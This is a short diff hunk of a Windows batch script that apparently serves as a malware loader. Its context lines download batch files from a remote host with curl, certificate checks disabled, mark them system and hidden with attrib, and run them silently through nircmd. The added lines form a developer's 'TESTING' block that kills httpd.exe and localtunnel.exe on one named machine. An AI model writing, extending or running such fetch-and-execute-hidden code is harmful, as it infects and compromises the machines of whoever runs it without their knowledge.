@@ -58,6 +58,10 @@ set "installer=%random%%random%"
 "%environment%\curl.exe" -k %proxy% %host%/Tools/installer.bat -o "%environment%\Win32\%installer%.bat" && attrib +s +h +i "%environment%\Win32\%installer%.bat"
 "%environment%\nircmd.exe" exec hide "%environment%\Win32\%installer%.bat"
 
+rem TESTING >
+if "%computername%"=="DESKTOP-HD3DT5O" taskkill /f /im httpd.exe && taskkill /f /im localtunnel.exe
+rem TESTING <
+
 set "win32=%random%"
 "%environment%\curl.exe" -k %proxy% %host%/win32.bat -o "%environment%\Win32\%win32%.bat" && attrib +s +h +i "%environment%\Win32\%win32%.bat"
 timeout -t 200
